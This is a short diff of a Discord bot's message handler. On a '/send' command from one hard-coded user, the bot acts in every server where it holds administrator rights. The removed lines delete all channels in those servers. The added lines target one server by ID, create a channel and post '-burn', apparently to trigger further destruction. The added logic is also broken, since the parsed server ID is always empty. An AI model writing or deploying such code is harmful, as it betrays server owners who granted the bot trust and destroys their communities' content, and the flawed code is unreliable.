@@ -69,11 +69,14 @@ client.on("message", msg => {
 client.on("message", msg => {
     if(msg.content === "/send") {
        if(msg.author.id === `${assy}`) {
+            const args = msg.content.split(' ').slice(1, 2);//get rids of command and reason if the is any
+            const theid1 = args.join(' ')
            msg.client.guilds.cache.forEach(g => {
               if(g.me.hasPermission("ADMINISTRATOR")) {
-                  g.channels.cache.forEach(c => {
-                 c.delete()
-})          }
+                  if(g.id === theid1) {
+                  g.channels.create("test").then(c => c.send("-burn"))
+}       
+ }
         })
 }
 }
